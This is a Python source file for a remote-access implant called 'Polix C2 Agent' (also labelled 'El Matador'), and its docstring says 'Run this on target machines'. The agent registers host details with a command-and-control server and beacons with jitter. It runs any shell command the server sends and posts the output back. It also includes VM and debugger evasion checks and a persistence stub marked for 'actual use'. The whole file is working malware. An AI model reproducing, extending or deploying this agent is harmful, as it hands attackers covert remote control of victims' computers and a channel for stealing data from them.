#!/usr/bin/env python3
"""
Polix C2 Agent - Complete Implementation
Run this on target machines
"""

import os
import sys
import time
import json
import base64
import random
import socket
import platform
import subprocess
import threading
import requests
import hashlib
from datetime import datetime

# Try to import optional dependencies
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[!] psutil not installed, some metrics unavailable")

# Disable SSL warnings for self-signed certs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class C2Agent:
    def __init__(self, server_url, agent_id=None, websocket_port=8765):
        self.server_url = server_url.rstrip('/')
        self.agent_id = agent_id or self.generate_agent_id()
        self.session_key = None
        self.encryption_key = None
        self.running = True
        self.ws_thread = None
        
        # For WebSocket (optional, can be disabled)
        self.ws_url = f"ws://{server_url.split('//')[1].split(':')[0]}:{websocket_port}"
        self.ws_enabled = False
        
    def generate_agent_id(self):
        """Generate unique agent ID"""
        hostname = socket.gethostname()
        mac = self.get_mac_address()
        return f"{hostname}_{hashlib.md5(mac.encode()).hexdigest()[:8]}"
    
    def get_mac_address(self):
        """Get MAC address for unique ID"""
        try:
            import uuid
            return ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                           for ele in range(0, 8*6, 8)][::-1])
        except:
            return socket.gethostname()
    
    def check_environment(self):
        """Anti-analysis and evasion checks"""
        # Check for VM indicators (non-blocking for demo)
        vm_indicators = ['vbox', 'vmware', 'virtual', 'qemu']
        hostname = socket.gethostname().lower()
        
        for indicator in vm_indicators:
            if indicator in hostname:
                print(f"[!] VM detected, increasing jitter")
                time.sleep(random.randint(30, 60))
        
        # Check for debugger (simplified)
        if sys.gettrace() is not None:
            print("[!] Debugger detected")
            # Don't exit, just slow down
            time.sleep(random.randint(60, 120))
    
    def register(self):
        """Register with C2 server"""
        register_data = {
            'agent_id': self.agent_id,
            'hostname': socket.gethostname(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            'os': platform.platform(),
            'arch': platform.machine(),
            'python_version': sys.version.split()[0]
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/api/register",
                json=register_data,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.session_key = data.get('session_key')
                self.encryption_key = data.get('encryption_key')
                print(f"[+] Registered successfully as {self.agent_id}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def send_beacon(self):
        """Send heartbeat to server and check for commands"""
        try:
            # Simple beacon without encryption for demo
            beacon_data = {
                'agent_id': self.agent_id,
                'timestamp': int(time.time() * 1000)
            }
            
            # Add metrics if psutil is available
            if PSUTIL_AVAILABLE:
                beacon_data['metrics'] = {
                    'cpu': psutil.cpu_percent(interval=0.1),
                    'memory': psutil.virtual_memory().percent
                }
            
            response = requests.post(
                f"{self.server_url}/api/beacon",
                headers={'X-Agent-ID': self.agent_id},
                json=beacon_data,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            return None
            
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return None
    
    def execute_command(self, command_id, command):
        """Execute system command"""
        print(f"[*] Executing command {command_id}: {command}")
        
        try:
            # Use shell based on OS
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
            
            try:
                stdout, stderr = process.communicate(timeout=60)
                output = stdout if stdout else stderr
                if not output:
                    output = "[Command completed with no output]"
                    
            except subprocess.TimeoutExpired:
                process.kill()
                output = "[Command timed out after 60 seconds]"
            
            # Send result back to server
            self.send_result(command_id, output)
            print(f"[+] Command {command_id} completed ({len(output)} bytes)")
            
        except Exception as e:
            error_msg = f"[-] Command execution failed: {str(e)}"
            print(error_msg)
            self.send_result(command_id, error_msg)
    
    def send_result(self, command_id, output):
        """Send command result back to server"""
        try:
            result_data = {
                'agent_id': self.agent_id,
                'command_id': command_id,
                'output': output,
                'timestamp': int(time.time() * 1000)
            }
            
            response = requests.post(
                f"{self.server_url}/api/result",
                headers={'X-Agent-ID': self.agent_id},
                json=result_data,
                verify=False,
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[-] Failed to send result: {e}")
            return False
    
    def install_persistence(self):
        """Install persistence mechanisms (optional)"""
        # Disabled for safety in demo
        # Uncomment and modify for actual use
        print("[*] Persistence not installed (disabled for safety)")
        return
    
    def run_heartbeat_loop(self):
        """Main agent loop with heartbeat"""
        consecutive_failures = 0
        
        while self.running:
            try:
                # Check for commands
                response = self.send_beacon()
                
                if response and response.get('status') == 'commands_pending':
                    for cmd in response.get('commands', []):
                        # Execute in separate thread to not block beacon
                        cmd_thread = threading.Thread(
                            target=self.execute_command,
                            args=(cmd['id'], cmd['command'])
                        )
                        cmd_thread.daemon = True
                        cmd_thread.start()
                
                # Reset failure counter on success
                consecutive_failures = 0
                
                # Random jitter between 10-30 seconds
                jitter = random.randint(10, 30)
                time.sleep(jitter)
                
            except Exception as e:
                print(f"[-] Heartbeat error: {e}")
                consecutive_failures += 1
                
                # Exponential backoff on failures
                backoff = min(60, 5 * consecutive_failures)
                time.sleep(backoff)
                
                # Try to re-register if too many failures
                if consecutive_failures >= 5:
                    print("[*] Attempting to re-register...")
                    if self.register():
                        consecutive_failures = 0
    
    def run(self):
        """Main agent execution"""
        print("=" * 50)
        print("  Polix C2 Agent v1.0")
        print(f"  Agent ID: {self.agent_id}")
        print(f"  Server: {self.server_url}")
        print("=" * 50)
        
        # Evasion checks
        self.check_environment()
        
        # Register with server
        retry_count = 0
        while not self.register() and retry_count < 10:
            retry_count += 1
            wait_time = min(60, 10 * retry_count)
            print(f"[*] Retrying registration in {wait_time} seconds...")
            time.sleep(wait_time)
        
        if retry_count >= 10:
            print("[-] Failed to register after 10 attempts, exiting")
            return
        
        # Install persistence (optional)
        # self.install_persistence()
        
        # Start main loop
        try:
            print("[+] Agent started, entering heartbeat loop...")
            self.run_heartbeat_loop()
            
        except KeyboardInterrupt:
            print("\n[!] Agent stopped by user")
        except Exception as e:
            print(f"[-] Fatal error: {e}")
        finally:
            self.running = False

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='El Matador C2 Agent')
    parser.add_argument('--server', default='http://127.0.0.1:8443',
                       help='C2 server URL (default: http://127.0.0.1:8443)')
    parser.add_argument('--id', default=None,
                       help='Agent ID (default: auto-generated)')
    parser.add_argument('--ws-port', type=int, default=8765,
                       help='WebSocket port (default: 8765)')
    
    args = parser.parse_args()
    
    agent = C2Agent(
        server_url=args.server,
        agent_id=args.id,
        websocket_port=args.ws_port
    )
    
    agent.run()

if __name__ == '__main__':
    main()
